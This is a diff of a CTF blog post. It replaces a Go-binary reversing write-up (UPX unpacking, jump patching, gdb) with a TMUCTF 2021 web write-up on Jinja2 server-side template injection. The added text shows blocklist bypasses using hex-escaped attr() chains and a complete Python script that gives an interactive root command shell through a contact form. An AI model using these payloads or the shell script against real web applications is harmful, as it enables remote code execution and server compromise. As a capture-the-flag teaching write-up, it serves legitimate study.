@@ -1,170 +1,219 @@
 ---
-title: 'GrabCON 2021: Unknown 2'
-date: 2021-09-05T00:00:00+00:00
+title: 'TMUCTF 2021: Injection'
+date: 2021-09-10T00:00:00+00:00
 author: Kris
 layout: post
-image: /images/2021/grabcon/unknown2title.jpg
+image: /images/2021/tmuctf/injectiontitle.png
 categories:
   - Write-Ups
-  - Reversing
+  - Web
 ---
-Fun CTF with quite a lot of variety in the challenges. I spent a bit of time on the binary reversing and pwning challenges this time because they seemed quite solvable for my basic skills. This is the 2nd in the "unknown" series.
+Great CTF with a lot of interesting challenges and props to them for running it mid-week. Lots of people have work on mid week but at night after work this gave me some fun diversion. This was a web challenge that seemed a bit tricky so only attracted a few solves. I'll go over how I did below.
 
-#### <a name="unknown2"></a>Unknown 2 - Reversing - 150 points
+#### <a name="injection"></a>Injection - Web - 401 points
 
 This challenge reads:
 
 ```
-I don't know.
+Injection
 
-Author: 0xSN1PE
+My friend designed a "Contact Us" page and told me that we could use it on the 
+TMUCTF website without any worries because she has taken into account all 
+security considerations to prevent any injections. I'm not sure so! What about 
+you?
 
-(27 solves)
+http://195.248.243.132
+
+(48 Solves)
 ```
 
-With the challenge we get this file:
+With a web challenge called `Injection` a few things come to mind. Firstly probably SQL Injection but more interestingly (to men anyway) is SSTI or Server Side Template Injection. Fortunately this challenge was one of the latter category. We can check this with a few quick tests.
 
-* `med_re_2 (sha1:3e0133b0db63a3bfee7d5d551ebff6957230b51d)`
+Many template engines use the "double curly brace" marker to surround template fields. If a website is written in such a way as to echo a user's input back and interpret that as part of the template code, the user may inject template language to be intepreted.
 
-As I'd do with any challenge a quick examination of the file reveals a packed Linux ELF binary:
+In our case entering some test data in the form we see the `name` field is echoed back to us:
+
+![name echoed](/images/2021/tmuctf/injection0.PNG)
+
+We test for SSTI basics by giving a name field like `{% raw %}{{3*5}}{% endraw %}` and we see the resulting message is `Dear 15, we have received your message ...`
+
+So we know now that our template inject has been intepreted because the server has carried out the multiplication of 3 * 5 for us.
+
+To identify which template engine we have there are a few steps you can read up about, especially by the folks over at [PortSwigger](https://portswigger.net/research/server-side-template-injection) who have published a lot of research on the topic but the basic steps we need to carry out here are:
+
+- Identify - Identify there is a vulnerabilty, which we did in our step above.
+- Detect - Detect which template engine we're dealing with.
+- Exploit - Use the engine's primatives to gain something useful - in our case we want RCE or at least arbitrary file read.
+
+#### Detecting the Template Engine
+
+In this step I got pretty lucky early on. I found one SSTI payload that helped me narrow down which engine we're seeing in this challenge very quickly. I used the `{% raw %}{{7*'7'}}{% endraw %}` trick. In this payload, the server is asked to multiply an integer by a string. Various languages treat this differently.
+
+PHP engines will cast the string to an integer and return `49`. Python engines treat the string as a string and return `7777777`.
+
+In our case here we see the server returned the `7777777` version:
+
+![7777777](/images/2021/tmuctf/injection3.png)
+
+Reading around this means we're likely dealing with a templating engine called `Jina2`. Now on to exploitation. 
+
+#### Exploitation Hurdles - Blocked Characters
+
+Before we go too far though, we run into a problem. The server has banned multiple useful characters necessary for the exploitation to be easy. In testing we found at least these characters and words were banned:
+
+- `[` and `]`
+- `_`
+- `.`
+- `self`
+- `shell`
+- and several others...
+
+This means we need workarounds. Fortunately the back end language of the templating engine is Python and Python has well documented filter bypass methods. I found [this article](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f) about the `|attr()`technique. This allows you to reference attributes of an object by string. Since python will decode hex encoded strings automatically, we can provide strings like `\x5f` in place of `_` and use `|attr('\x5f\x5fclass\x5f\x5f')` to say, access the `__class__` attribute on an object. 
+
+We can string large lengths of these together to access important classes and methods that are already imported. For example, this payload in the `name` field will list a large number of imported subclasses:
+
+`{% raw %}{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}{% endraw %}`
+
+Most importantly we want to find the `subprocess.Popen` method and use it to execute commands. If we inspect closely and count the index from the start, we see there in the list at index 360 is `subprocess.Popen`. We need that 360 number for the next step.
+
+#### Listing Subclasses -> RCE...
+
+Since we found the index of `subprocess.Popen` we can call it directly, the payload below describes how.
+
+````python
+{% raw %}{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(360)('id',stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}{% endraw %}
+````
+
+We're invoking the 360'th item in the list of subclasses which is `subprocess.Popen` with a string argument.  We're calling the communicate method and getitem on the 0th returned index item. This gives us the following:
+
+`Dear b'uid=0(root) gid=0(root) groups=0(root)\n', we have received your message`
+
+Nice :D
+
+Unfortunately, initially I was stuck here though because of the filter of `[` and `]` characters. As well as the filter of `shell`keyword. Without these two things I thought we cannot pass arguments to our shell commands.
+
+Then I remembered that Python would like accept a `tuple` in place of a `list` and tuples use  parenthesis`(` and `)`which go through the filter ok. This allows us to create a `Popen` call with any number of arguments. It was at this point I wrote some code to give me a remote command shell:
+
+```python
+import html
+import requests
+
+url =  "http://195.248.243.132/contact"
+
+def hexx(s):
+    return ''.join([hex(ord(i)).replace("0x","\\x") for i in s])
+
+s = requests.Session()
+
+while True:
+    cmd = input("$ ").strip()
+
+    # encode entire shell command to ensure every filter is bypassed.    
+    cmd = cmd.split()
+    sh = '('
+    for c in range(len(cmd)-1):
+        sh += "'" + hexx(cmd[c]) + "',"
+    
+    sh += "'" + hexx(cmd[-1]) + "')"
+
+    payload = "{% raw %}{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(360)(%s,stdout=-1)|attr('communicate')()|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(0)}}{% endraw %}" % sh
+    data = {'name':payload, 'email':'b', 'message':'b', 'submit':''}
+    r = s.post(url, data=data)
+
+    try:
+        res = r.content.decode().split('Dear ')[1].split(', we have')[0]
+    except IndexError:
+        print("Error: %s" % r.content)
+        quit()
+
+    res = html.unescape(html.unescape(res))[2:-1]
+    for line in res.split('\\n'):
+        print(line)
+```
+
+This gives me an interactive shell essentially so I can look for the flag:
 
 ```shell
-$ file med_re_2 
-med_re_2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), statically
-linked, no section header
-$ strings med_re_2 | grep UPX
+$ ./shell.py 
+$ ls -la
+total 40
+drwxr-x--- 1 root ctf  4096 Sep 10 01:44 .
+drwxr-xr-x 1 root root 4096 Sep  9 07:55 ..
+drwxr-xr-x 2 root root 4096 Sep  9 07:56 __pycache__
+-rwxr-x--- 1 root ctf  1150 Sep  6 17:15 app.py
+-rwxr-x--- 1 root ctf    54 Sep  3 00:51 help
+-rwxr-x--- 1 root ctf    33 Sep  3 02:49 requirements.txt
+drwxr-x--- 1 root ctf  4096 Sep  9 07:48 static
+drwxr-x--- 1 root ctf  4096 Sep  9 07:48 templates
+
+$ whoami
+root
+```
+
+The flag was non-obvious so I looked around. I finally looked in the `help` file (it took way too long to do that lol).
+
+```shell
+$ cat help
+The flag is inside the last file I put in /opt/tmuctf/
+```
+
+Oh lol ok, but that folder is huge:
+
+```
+$ ls -la /opt/tmuctf
+total 2024
+drwxr-xr-x 1 root root 20480 Sep  9 07:56 .
+drwxr-xr-x 1 root root  4096 Sep  9 07:55 ..
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0HPRt8Zsga
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0KNgstCMj4
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0LWgk9sRNA
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0MjWEJHPEx
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0Rjw8PzdYK
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0VyLikI21f
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0dN0v7uDz3
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0m3sAEzQLW
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0os35ZWCDM
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0tjgfHpJKS
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0ueHc9aJr1
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0uvJQd5KVh
+-rw-r--r-- 1 root root   104 Sep  9 07:55 0vLO97zOsB
+-rw-r--r-- 1 root root   104 Sep  9 07:55 14YF5kEJlJ
+-rw-r--r-- 1 root root   104 Sep  9 07:55 19yWGJO4d6
+
+... 2000 items!!!
+
+$
+```
+
+Well we know its supposed to be the last item placed inside the folder. Hmm I wonder if `ls` has a flag to get more time information? Sure enough theres a flag called `--full-time` and when we use that we see 1 file stand out:
+
+```shell
+$ ls --full-time -a /opt/tmuctf
 ...
-$Info: This file is packed with the UPX executable packer http://upx.sf.net $
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 v6rnYYqKop
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vKm3WGcYiO
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vRFOxZaDq0
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vS55c2rs7q
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vUfdYC0957
 
-```
-
-Fortunately the file unpacks cleanly with `upx -d`
-
-```shell
-$ ls -la med_re_2 
--rwxrw-rw- 1 root root 19952 Sep  5 15:49 med_re_2     
-
-$ upx -d med_re_2                                                                                                                         
-                       Ultimate Packer for eXecutables                                                       
-                          Copyright (C) 1996 - 2020                                                           
-UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020                                 
-
-        File size         Ratio      Format      Name                                                         
-   --------------------   ------   -----------   -----------                                                 
-     53088 <-     19952   37.58%   linux/amd64   med_re_2                                                    
-     
-Unpacked 1 file.                                                                                             
-$ ls -la med_re_2                                                                                           
--rwxrw-rw- 1 root root 53088 Sep  5 15:49 med_re_2
-$ file med_re_2
-med_re_2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically 
-linked, interpreter /lib64/ld-linux-x86-64.so.2, 
-BuildID[sha1]=8c647d87ce01879a967ee42dc5d9d4111a6b1b19, for GNU/Linux 3.2.0, 
-with debug_info, not stripped
-```
-
-Running the file gives us very little new information, it doesn't ask for a key or anything:
-
-```shell
-$ ./med_re_2
-
-___.          .__                              
-\_ |__ _____  |  | _____    ____   ____  ____  
- | __ \\__  \ |  | \__  \  /    \_/ ___\/ __ \ 
- | \_\ \/ __ \|  |__/ __ \|   |  \  \__\  ___/ 
- |___  (____  /____(____  /___|  /\___  >___  >
-     \/     \/          \/     \/     \/    \/ 
-
-
-Comparison is the death of joy.
-```
-
-In `ghidra` we learn a lot more, firstly it's a Golang binary which means we need to start in the `main.main` function. Here we see after some searching that the flag related stuff happens in a function called `main.one` which is gated by some comparison:
-
-![main.main function](/images/2021/grabcon/unknown21.PNG)
-
-I don't really know what the comparison is and instead of messing about checking it, I figured I might try and patch it out instead. 
-
-To do this I changed the instruction at `0x00103f96` from a `JNZ` (opcode `75`) to a `JMP` (opcode `74`) with a hex editor. I saved the patched binary and ran it again, the behaviour changes:
-
-![patching binary](/images/2021/grabcon/unknown22.PNG)
-
-```shell
-$ ./patch1                                                                       
-
-___.          .__                              
-\_ |__ _____  |  | _____    ____   ____  ____  
- | __ \\__  \ |  | \__  \  /    \_/ ___\/ __ \ 
- | \_\ \/ __ \|  |__/ __ \|   |  \  \__\  ___/ 
- |___  (____  /____(____  /___|  /\___  >___  >
-     \/     \/          \/     \/     \/    \/ 
-
-Enter the password: 
-Go back
-```
-
-Now it wants a password. I don't know what the password it expects is but after some looking around in the `main.one` function I come across another comparison:
-
-![another comparison](/images/2021/grabcon/unknown23.PNG)
-
-After some trial and error in `gdb` I confirm that the code is summing the ascii values of the characters of the password. If the sum total of the characters is equal to 0x195 then this check succeeds. Notice below how I first saw this. When I sent the password `A` then the comparison was  `0x195 == 0x41?`
-
-```shell
-$ gdb ./patch1                                                                   
+-rw-r--r-- 1 root root   104 2021-09-09 07:56:00.000000000 +0000 vaYxVj7si8
+                                        ^^^^^^^^
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vcmumaQ18X
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vkmUTz7H6P
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vmK3yEEZWG
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vnwy8EMyZL
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vrieBZRJt9
+-rw-r--r-- 1 root root   104 2021-09-09 07:55:59.000000000 +0000 vwR41q4SlN
 ...
-Reading symbols from ./patch1...
-gdb-peda$ br *0x555555557a8b
-Breakpoint 1 at 0x555555557a8b
-gdb-peda$ r
-Starting program: /root/grabcon/unknown2/patch1 
-
-___.          .__                              
-\_ |__ _____  |  | _____    ____   ____  ____  
- | __ \\__  \ |  | \__  \  /    \_/ ___\/ __ \ 
- | \_\ \/ __ \|  |__/ __ \|   |  \  \__\  ___/ 
- |___  (____  /____(____  /___|  /\___  >___  >
-     \/     \/          \/     \/     \/    \/ 
-
-
-Enter the password: 
-A
-...
-[-------------------------------------code-------------------------------------]
-   0x555555557a7d <main.one+1140>:      mov    rax,QWORD PTR [rax+0x8]
-   0x555555557a81 <main.one+1144>:      cmp    QWORD PTR [rbp-0x48],rax
-   0x555555557a85 <main.one+1148>:      jl     0x5555555579a6 <main.one+925>
-=> 0x555555557a8b <main.one+1154>:      cmp    QWORD PTR [rbp-0x38],0x195
-...
-
-Thread 1 "patch1" hit Breakpoint 1, main.one () at med_re_2.go:30
-30      med_re_2.go: No such file or directory.
-
-gdb-peda$ x/1wx $rbp-0x38
-0x7fffcf7aad58: 0x00000041
-gdb-peda$
 ```
 
-To get an ASCII string with values of 0x195 (405 decimal) I just send char 50 (ascii `2`) x 7 and char 55 (ascii `7`) x 1: 
-
-- `22222227 = 0x195`
-
-I ran the patched program and entered that password, not sure what to expect:
+We look at that file and get the flag:
 
 ```shell
-$ ./patch1                                                                                                                                                                               
-___.          .__
-\_ |__ _____  |  | _____    ____   ____  ____  
- | __ \\__  \ |  | \__  \  /    \_/ ___\/ __ \ 
- | \_\ \/ __ \|  |__/ __ \|   |  \  \__\  ___/ 
- |___  (____  /____(____  /___|  /\___  >___  >
-     \/     \/          \/     \/     \/    \/ 
-
-Enter the password: 
-22222227 
-Here ya go -> GrabCON{ 626c61636b647261676f6e }
+$ base64 -d /opt/tmuctf/vaYxVj7si8
+TMUCTF{0h!_y0u_byp4553d_4ll_my_bl4ckl157!!!__1_5h0uld_h4v3_b33n_m0r3_c4r3ful}
+$ 
 ```
 
-However I got the flag straight away. I wasn't expecting it, but it was done. 
-
-Probably my first Golang RE challenge in a CTF and I didn't mind it that much.
+Fun challenge! Thanks to the TMU CTF Crew who were all extremely friendly and helpful throughout the CTF.
 
